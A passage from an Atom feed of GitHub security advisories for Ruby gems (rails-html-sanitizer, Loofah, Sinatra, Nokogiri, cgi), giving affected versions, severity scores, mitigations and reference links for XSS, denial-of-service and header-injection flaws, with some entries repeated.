<li>allow both "math" and "style" elements,</li>
<li>or allow both "svg" and "style" elements</li>
</ul>
<p>Code is only impacted if allowed tags are being overridden. Applications may be doing this in four different ways:</p>
<ol>
<li>using application configuration:</li>
</ol>
<pre><code class="language-ruby"># In config/application.rb
config.action_view.sanitized_allowed_tags = ["math", "style"]
# or
config.action_view.sanitized_allowed_tags = ["svg", "style"]
</code></pre>
<p>  see <a href="https://guides.rubyonrails.org/configuring.html#configuring-action-view">https://guides.rubyonrails.org/configuring.html#configuring-action-view</a></p>
<ol start="2">
<li>using a <code>:tags</code> option to the Action View helper <code>sanitize</code>:</li>
</ol>
<pre><code>&lt;%= sanitize @comment.body, tags: ["math", "style"] %&gt;
&lt;%# or %&gt;
&lt;%= sanitize @comment.body, tags: ["svg", "style"] %&gt;
</code></pre>
<p>  see <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize">https://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html#method-i-sanitize</a></p>
<ol start="3">
<li>using Rails::Html::SafeListSanitizer class method <code>allowed_tags=</code>:</li>
</ol>
<pre><code class="language-ruby"># class-level option
Rails::Html::SafeListSanitizer.allowed_tags = ["math", "style"]
# or
Rails::Html::SafeListSanitizer.allowed_tags = ["svg", "style"]
</code></pre>
<ol start="4">
<li>using a <code>:tags</code> options to the Rails::Html::SafeListSanitizer instance method <code>sanitize</code>:</li>
</ol>
<pre><code class="language-ruby"># instance-level option
Rails::Html::SafeListSanitizer.new.sanitize(@article.body, tags: ["math", "style"])
# or
Rails::Html::SafeListSanitizer.new.sanitize(@article.body, tags: ["svg", "style"])
</code></pre>
<p>All users overriding the allowed tags by any of the above mechanisms to include (("math" or "svg") and "style") should either upgrade or use one of the workarounds immediately.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Remove "style" from the overridden allowed tags, or remove "math" and "svg" from the overridden allowed tags.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)</a></li>
<li><a href="https://hackerone.com/reports/1656627">https://hackerone.com/reports/1656627</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by Dominic Breuker.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-9h9g-93gc-623h">https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-9h9g-93gc-623h</a></li>
<li><a href="https://hackerone.com/reports/1656627">https://hackerone.com/reports/1656627</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23519.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23519.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23519">https://nvd.nist.gov/vuln/detail/CVE-2022-23519</a></li>
<li><a href="https://github.com/advisories/GHSA-9h9g-93gc-623h">https://github.com/advisories/GHSA-9h9g-93gc-623h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9h9g-93gc-623h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-13T17:50:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails-html-sanitizer] Improper neutralization of data URIs may allow XSS in rails-html-sanitizer]]></title>
        <id>https://github.com/advisories/GHSA-mcvf-2q2m-x72m</id>
        <link href="https://github.com/advisories/GHSA-mcvf-2q2m-x72m"/>
        <updated>2022-12-16T21:45:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>rails-html-sanitizer <code>&gt;= 1.0.3, &lt; 1.4.4</code> is vulnerable to cross-site scripting via data URIs when used in combination with Loofah <code>&gt;= 2.1.0</code>.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to rails-html-sanitizer <code>&gt;= 1.4.4</code>.</p>
<h2 id="severity">Severity</h2>
<p>The maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N">Medium Severity 6.1</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)</a></li>
<li><a href="https://github.com/w3c/svgwg/issues/266">SVG MIME Type (image/svg+xml) is misleading to developers · Issue #266 · w3c/svgwg</a></li>
<li><a href="https://github.com/rails/rails-html-sanitizer/issues/135">https://github.com/rails/rails-html-sanitizer/issues/135</a></li>
<li><a href="https://hackerone.com/reports/1694173">https://hackerone.com/reports/1694173</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was independently reported by Maciej Piechota (@haqpl) and Mrinmoy Das (@goromlagche).</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-mcvf-2q2m-x72m">https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-mcvf-2q2m-x72m</a></li>
<li><a href="https://github.com/rails/rails-html-sanitizer/issues/135">https://github.com/rails/rails-html-sanitizer/issues/135</a></li>
<li><a href="https://github.com/w3c/svgwg/issues/266">https://github.com/w3c/svgwg/issues/266</a></li>
<li><a href="https://hackerone.com/reports/1694173">https://hackerone.com/reports/1694173</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23518.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23518.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23518">https://nvd.nist.gov/vuln/detail/CVE-2022-23518</a></li>
<li><a href="https://github.com/advisories/GHSA-mcvf-2q2m-x72m">https://github.com/advisories/GHSA-mcvf-2q2m-x72m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcvf-2q2m-x72m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-13T17:45:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rails-html-sanitizer] Inefficient Regular Expression Complexity in rails-html-sanitizer]]></title>
        <id>https://github.com/advisories/GHSA-5x79-w82f-gw8w</id>
        <link href="https://github.com/advisories/GHSA-5x79-w82f-gw8w"/>
        <updated>2022-12-14T20:45:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Certain configurations of rails-html-sanitizer <code>&lt; 1.4.4</code> use an inefficient regular expression that is susceptible to excessive backtracking when attempting to sanitize certain SVG attributes. This may lead to a denial of service through CPU resource consumption.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to rails-html-sanitizer <code>&gt;= 1.4.4</code>.</p>
<h2 id="severity">Severity</h2>
<p>The maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H">High Severity 7.5 (CVSS3.1)</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/1333.html">CWE - CWE-1333: Inefficient Regular Expression Complexity (4.9)</a></li>
<li><a href="https://hackerone.com/reports/1684163">https://hackerone.com/reports/1684163</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by @ooooooo-q (<a href="https://github.com/ooooooo-q">https://github.com/ooooooo-q</a>).</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-5x79-w82f-gw8w">https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-5x79-w82f-gw8w</a></li>
<li><a href="https://github.com/rails/rails-html-sanitizer/commit/56c61c0cebd1e493e8ad7bca2a0191609a4a6979">https://github.com/rails/rails-html-sanitizer/commit/56c61c0cebd1e493e8ad7bca2a0191609a4a6979</a></li>
<li><a href="https://hackerone.com/reports/1684163">https://hackerone.com/reports/1684163</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23517.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rails-html-sanitizer/CVE-2022-23517.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23517">https://nvd.nist.gov/vuln/detail/CVE-2022-23517</a></li>
<li><a href="https://github.com/advisories/GHSA-5x79-w82f-gw8w">https://github.com/advisories/GHSA-5x79-w82f-gw8w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5x79-w82f-gw8w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-13T17:43:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[loofah] Uncontrolled Recursion in Loofah]]></title>
        <id>https://github.com/advisories/GHSA-3x8r-x6xp-q4vm</id>
        <link href="https://github.com/advisories/GHSA-3x8r-x6xp-q4vm"/>
        <updated>2022-12-14T20:45:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Loofah <code>&gt;= 2.2.0, &lt; 2.19.1</code> uses recursion for sanitizing <code>CDATA</code> sections, making it susceptible to stack exhaustion and raising a <code>SystemStackError</code> exception.  This may lead to a denial of service through CPU resource consumption.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to Loofah <code>&gt;= 2.19.1</code>.</p>
<p>Users who are unable to upgrade may be able to mitigate this vulnerability by limiting the length of the strings that are sanitized.</p>
<h2 id="severity">Severity</h2>
<p>The Loofah maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H">High Severity 7.5 (CVSS3.1)</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/674.html">CWE - CWE-674: Uncontrolled Recursion (4.9)</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/flavorjones/loofah/security/advisories/GHSA-3x8r-x6xp-q4vm">https://github.com/flavorjones/loofah/security/advisories/GHSA-3x8r-x6xp-q4vm</a></li>
<li><a href="https://github.com/flavorjones/loofah/commit/86f7f6364491b0099d215db858ecdc0c89ded040">https://github.com/flavorjones/loofah/commit/86f7f6364491b0099d215db858ecdc0c89ded040</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23516.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23516.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23516">https://nvd.nist.gov/vuln/detail/CVE-2022-23516</a></li>
<li><a href="https://github.com/advisories/GHSA-3x8r-x6xp-q4vm">https://github.com/advisories/GHSA-3x8r-x6xp-q4vm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3x8r-x6xp-q4vm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-13T17:40:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[loofah] Improper neutralization of data URIs may allow XSS in Loofah]]></title>
        <id>https://github.com/advisories/GHSA-228g-948r-83gx</id>
        <link href="https://github.com/advisories/GHSA-228g-948r-83gx"/>
        <updated>2022-12-14T20:45:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Loofah <code>&gt;= 2.1.0, &lt; 2.19.1</code> is vulnerable to cross-site scripting via the <code>image/svg+xml</code> media type in data URIs.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to Loofah <code>&gt;= 2.19.1</code>.</p>
<h2 id="severity">Severity</h2>
<p>The Loofah maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N">Medium Severity 6.1</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (4.9)</a></li>
<li><a href="https://github.com/w3c/svgwg/issues/266">SVG MIME Type (image/svg+xml) is misleading to developers · Issue #266 · w3c/svgwg</a></li>
<li><a href="https://hackerone.com/reports/1694173">https://hackerone.com/reports/1694173</a></li>
<li><a href="https://github.com/flavorjones/loofah/issues/101">https://github.com/flavorjones/loofah/issues/101</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by Maciej Piechota (@haqpl).</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/flavorjones/loofah/security/advisories/GHSA-228g-948r-83gx">https://github.com/flavorjones/loofah/security/advisories/GHSA-228g-948r-83gx</a></li>
<li><a href="https://github.com/flavorjones/loofah/issues/101">https://github.com/flavorjones/loofah/issues/101</a></li>
<li><a href="https://github.com/w3c/svgwg/issues/266">https://github.com/w3c/svgwg/issues/266</a></li>
<li><a href="https://github.com/flavorjones/loofah/commit/415677f3cf7f9254f42f811e784985cd63c7407f">https://github.com/flavorjones/loofah/commit/415677f3cf7f9254f42f811e784985cd63c7407f</a></li>
<li><a href="https://hackerone.com/reports/1694173">https://hackerone.com/reports/1694173</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23515.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23515.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23515">https://nvd.nist.gov/vuln/detail/CVE-2022-23515</a></li>
<li><a href="https://github.com/advisories/GHSA-228g-948r-83gx">https://github.com/advisories/GHSA-228g-948r-83gx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-228g-948r-83gx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-13T17:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[loofah] Inefficient Regular Expression Complexity in Loofah]]></title>
        <id>https://github.com/advisories/GHSA-486f-hjj9-9vhh</id>
        <link href="https://github.com/advisories/GHSA-486f-hjj9-9vhh"/>
        <updated>2022-12-14T20:45:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Loofah <code>&lt; 2.19.1</code> contains an inefficient regular expression that is susceptible to excessive backtracking when attempting to sanitize certain SVG attributes. This may lead to a denial of service through CPU resource consumption.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to Loofah <code>&gt;= 2.19.1</code>.</p>
<h2 id="severity">Severity</h2>
<p>The Loofah maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H">High Severity 7.5 (CVSS3.1)</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/1333.html">CWE - CWE-1333: Inefficient Regular Expression Complexity (4.9)</a></li>
<li><a href="https://hackerone.com/reports/1684163">https://hackerone.com/reports/1684163</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by @ooooooo-q (<a href="https://github.com/ooooooo-q">https://github.com/ooooooo-q</a>).</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/flavorjones/loofah/security/advisories/GHSA-486f-hjj9-9vhh">https://github.com/flavorjones/loofah/security/advisories/GHSA-486f-hjj9-9vhh</a></li>
<li><a href="https://github.com/flavorjones/loofah/commit/a6e0a1ab90675a17b1b2be189129d94139e4b143">https://github.com/flavorjones/loofah/commit/a6e0a1ab90675a17b1b2be189129d94139e4b143</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23514.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/loofah/CVE-2022-23514.yml</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23514">https://nvd.nist.gov/vuln/detail/CVE-2022-23514</a></li>
<li><a href="https://hackerone.com/reports/1684163">https://hackerone.com/reports/1684163</a></li>
<li><a href="https://github.com/advisories/GHSA-486f-hjj9-9vhh">https://github.com/advisories/GHSA-486f-hjj9-9vhh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-486f-hjj9-9vhh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-13T17:36:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sinatra] Sinatra vulnerable to Reflected File Download attack]]></title>
        <id>https://github.com/advisories/GHSA-2x8x-jmrp-phxw</id>
        <link href="https://github.com/advisories/GHSA-2x8x-jmrp-phxw"/>
        <updated>2022-12-12T20:48:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>An issue was discovered in Sinatra 2.0 before 2.2.3 and 3.0 before 3.0.4. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a response when the filename is derived from user-supplied input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sinatra/sinatra/security/advisories/GHSA-2x8x-jmrp-phxw">https://github.com/sinatra/sinatra/security/advisories/GHSA-2x8x-jmrp-phxw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-45442">https://nvd.nist.gov/vuln/detail/CVE-2022-45442</a></li>
<li><a href="https://github.com/sinatra/sinatra/commit/ea8fc9495a350f7551b39e3025bfcd06f49f363b">https://github.com/sinatra/sinatra/commit/ea8fc9495a350f7551b39e3025bfcd06f49f363b</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
<li><a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sinatra/CVE-2022-45442.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sinatra/CVE-2022-45442.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-2x8x-jmrp-phxw">https://github.com/advisories/GHSA-2x8x-jmrp-phxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2x8x-jmrp-phxw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-30T21:18:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nokogiri] Unchecked return value from xmlTextReaderExpand]]></title>
        <id>https://github.com/advisories/GHSA-qv4q-mr5r-qprj</id>
        <link href="https://github.com/advisories/GHSA-qv4q-mr5r-qprj"/>
        <updated>2022-12-08T14:38:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Nokogiri <code>1.13.8, 1.13.9</code> fails to check the return value from <code>xmlTextReaderExpand</code> in the method <code>Nokogiri::XML::Reader#attribute_hash</code>. This can lead to a null pointer exception when invalid markup is being parsed. </p>
<p>For applications using <code>XML::Reader</code> to parse untrusted inputs, this may potentially be a vector for a denial of service attack.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Upgrade to Nokogiri <code>&gt;= 1.13.10</code>.</p>
<p>Users may be able to search their code for calls to either <code>XML::Reader#attributes</code> or <code>XML::Reader#attribute_hash</code> to determine if they are affected.</p>
<h2 id="severity">Severity</h2>
<p>The Nokogiri maintainers have evaluated this as <a href="https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H">High Severity 7.5 (CVSS3.1)</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/252.html">CWE - CWE-252: Unchecked Return Value (4.9)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/476.html">CWE - CWE-476: NULL Pointer Dereference (4.9)</a></li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was responsibly reported by @davidwilemski.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-qv4q-mr5r-qprj">https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-qv4q-mr5r-qprj</a></li>
<li><a href="https://github.com/sparklemotion/nokogiri/commit/85410e38410f670cbbc8c5b00d07b843caee88ce">https://github.com/sparklemotion/nokogiri/commit/85410e38410f670cbbc8c5b00d07b843caee88ce</a></li>
<li><a href="https://github.com/sparklemotion/nokogiri/commit/9fe0761c47c0d4270d1a5220cfd25de080350d50">https://github.com/sparklemotion/nokogiri/commit/9fe0761c47c0d4270d1a5220cfd25de080350d50</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23476">https://nvd.nist.gov/vuln/detail/CVE-2022-23476</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/CVE-2022-23476.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/nokogiri/CVE-2022-23476.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-qv4q-mr5r-qprj">https://github.com/advisories/GHSA-qv4q-mr5r-qprj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qv4q-mr5r-qprj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-08T03:03:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sinatra] Sinatra vulnerable to Reflected File Download attack]]></title>
        <id>https://github.com/advisories/GHSA-2x8x-jmrp-phxw</id>
        <link href="https://github.com/advisories/GHSA-2x8x-jmrp-phxw"/>
        <updated>2022-12-12T20:48:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>An issue was discovered in Sinatra 2.0 before 2.2.3 and 3.0 before 3.0.4. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a response when the filename is derived from user-supplied input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/sinatra/sinatra/security/advisories/GHSA-2x8x-jmrp-phxw">https://github.com/sinatra/sinatra/security/advisories/GHSA-2x8x-jmrp-phxw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-45442">https://nvd.nist.gov/vuln/detail/CVE-2022-45442</a></li>
<li><a href="https://github.com/sinatra/sinatra/commit/ea8fc9495a350f7551b39e3025bfcd06f49f363b">https://github.com/sinatra/sinatra/commit/ea8fc9495a350f7551b39e3025bfcd06f49f363b</a></li>
<li><a href="https://github.com/advisories/GHSA-8x94-hmjh-97hq">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>
<li><a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sinatra/CVE-2022-45442.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sinatra/CVE-2022-45442.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-2x8x-jmrp-phxw">https://github.com/advisories/GHSA-2x8x-jmrp-phxw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2x8x-jmrp-phxw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-30T21:18:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] HTTP response splitting in CGI]]></title>
        <id>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</id>
        <link href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5"/>
        <updated>2022-12-30T00:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>Ruby gem cgi.rb prior to versions 0.3.5, 0.2.2 and 0.1.0.2 allow HTTP header injection. If a CGI application using the CGI library inserts untrusted input into the HTTP response header, an attacker can exploit it to insert a newline character to split a header, and inject malicious content to deceive clients. This issue has been patched in versions 0.3.5, 0.2.2 and 0.1.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33621">https://nvd.nist.gov/vuln/detail/CVE-2021-33621</a></li>
<li><a href="https://hackerone.com/reports/1204695">https://hackerone.com/reports/1204695</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/">https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YACE6ORF2QBXXBK2V2CM36D7TZMEJVAS/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/THVTYHHEOVLQFCFHWURZYO7PVUPBHRZD/</a></li>
<li><a href="https://security.netapp.com/advisory/ntap-20221228-0004/">https://security.netapp.com/advisory/ntap-20221228-0004/</a></li>
<li><a href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5">https://github.com/advisories/GHSA-vc47-6rqg-c7f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-11-19T00:30:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cgi] HTTP response splitting in CGI]]></title>
        <id>https://github.com/advisories/GHSA-vc47-6rqg-c7f5</id>
        <link href="https://github.com/advisories/GHSA-vc47-6rqg-c7f5"/>
        <updated>2022-12-30T00:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>Ruby gem cgi.rb prior to versions 0.3.5, 0.2.2 and 0.1.0.2 allow HTTP header injection. If a CGI application using the CGI library inserts untrusted input into the HTTP response header, an attacker can exploit it to insert a newline character to split a header, and inject malicious content to deceive clients. This issue has been patched in versions 0.3.5, 0.2.2 and 0.1.0.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33621">https://nvd.nist.gov/vuln/detail/CVE-2021-33621</a></li>
<li><a href="https://hackerone.com/reports/1204695">https://hackerone.com/reports/1204695</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/cgi/CVE-2021-33621.yml</a></li>
<li><a href="https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/">https://www.ruby-lang.org/en/news/2022/11/22/http-response-splitting-in-cgi-cve-2021-33621/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DQR7LWED6VAPD5ATYOBZIGJQPCUBRJBX/</a></li>
